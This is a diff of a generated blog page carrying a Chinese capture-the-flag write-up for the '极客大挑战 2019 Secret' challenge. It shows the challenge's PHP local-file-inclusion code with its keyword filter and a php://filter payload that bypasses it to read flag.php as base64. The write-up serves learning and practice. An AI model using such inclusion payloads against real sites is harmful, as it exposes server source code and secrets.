@@ -390,19 +390,19 @@
 
       
         <h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="极客大挑战 2019 Secret"></a>极客大挑战 2019 Secret</h1><p>打开题目 发现小㊙  查看一下源码 得到文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Archive_room.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Archive_room</span>.</span></span>php</span><br></pre></td></tr></table></figure>
 <p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/0.png" alt="avatar"><br>点击SECRET</p>
 <p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/1.png" alt="avatar"><br>看来要用BP抓包了</p>
 <p>通过抓包确实得到一个action.php的文件<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/2.png" alt="avatar"></p>
 <p>放到Reapter中 发包  得到文件secr3t.php </p>
 <p>访问得到源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">    $file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($file); </span></span><br><span class="line"><span class="php"><span class="comment">//flag放在了flag.php里</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>审计之后 构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?<span class="attribute">file</span>=flag.php</span><br></pre></td></tr></table></figure>
 <p>发现不太行</p>
 <p>使用伪协议读取</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <p>得到base64  解码得到flag</p>
 
@@ -528,7 +528,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -539,7 +539,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
